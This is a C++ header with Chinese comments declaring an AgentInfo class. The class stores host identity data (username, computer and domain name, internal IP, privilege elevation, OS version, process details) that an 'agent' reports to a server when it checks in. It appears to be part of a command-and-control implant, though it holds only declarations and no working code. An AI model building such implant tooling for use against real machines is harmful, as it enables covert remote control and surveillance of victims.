// 文件作用：Windows 主机信息结构声明：保存 agent 上线时要回传的主机身份字段。
#pragma once

#include <windows.h>

// AgentInfo 保存 agent 上线时报告给服务端的机器身份信息。
class AgentInfo
{
public:
	DWORD agent_id;
	WORD  acp;
	WORD  oemcp;
	BYTE  gmt_offest;
	WORD  pid;
	WORD  tid;
	BOOL  arch64;
	BOOL  sys64;
	BOOL  elevated;
	BOOL  is_server;
	WORD  major_version;
	WORD  minor_version;
	WORD  build_number;
	ULONG internal_ip;
	CHAR* process_name;
	CHAR* domain_name;
	CHAR* computer_name;
	CHAR* username;

	// 构造函数采集或填充主机身份字段。
	AgentInfo();

	// operator new 走自定义内存分配。
	static void* operator new(size_t sz);
	// operator delete 走自定义内存释放。
	static void operator delete(void* p) noexcept;
};